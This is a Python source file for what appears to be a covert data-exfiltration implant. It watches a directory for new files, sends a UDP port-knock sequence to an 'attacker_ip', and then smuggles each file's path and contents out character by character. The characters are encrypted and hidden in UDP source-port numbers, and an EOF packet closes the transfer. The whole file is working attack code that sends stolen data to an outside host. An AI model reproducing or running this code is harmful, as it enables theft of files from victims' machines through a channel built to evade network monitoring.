import time
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from pathlib import Path
from encryption import encrypt
import config


def send_knock():
    for port in config.monitor_knock_sequence:
        packet = IP(dst=config.attacker_ip) / UDP(dport=port)
        send(packet, verbose=False)
    print("Sequence for opening port sent.")


def on_created(event):
    path = Path(event.src_path)
    
    if path.is_file():
        print(f"File created: {path}\n")
        f = open(path, "r")
        data = f.read()
        f.close()

        # Port knock attacker to open port for transfer
        send_knock()
        send_content(event.src_path, data)

    elif path.is_dir():
        print(f"Directory created: {path}\nSkipping as directories cannot be sent...")
    

def send_content(path, data):
    filepath = "Created File: " + path + "\n\n"
    filepath_and_data = filepath + data 
    print("Converting data to bytes and encrypting...")
    for char in filepath_and_data:
        encrypted_char = encrypt(char)
        source_port = int.from_bytes(encrypted_char, byteorder='big')
        packet = IP(dst=config.attacker_ip) / UDP(sport=source_port, dport=config.attacker_monitor_port) / ""
        send(packet, verbose=False)
    print("File encrypted and sent!")

    termination_packet = IP(dst=config.attacker_ip) / UDP(dport=config.attacker_monitor_port) / b"EOF"
    send(termination_packet, verbose=False)

    print("Termination request sent.\n")

def monitor():
    event_handler = FileSystemEventHandler()

    event_handler.on_created = on_created

    observer = Observer()
    observer.schedule(event_handler, config.watch_path, recursive=False)
    observer.start()

    try:
        print(f"Monitoring: {config.watch_path}\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

# def main():
#     monitor()


# if __name__ == "__main__":
#     main()
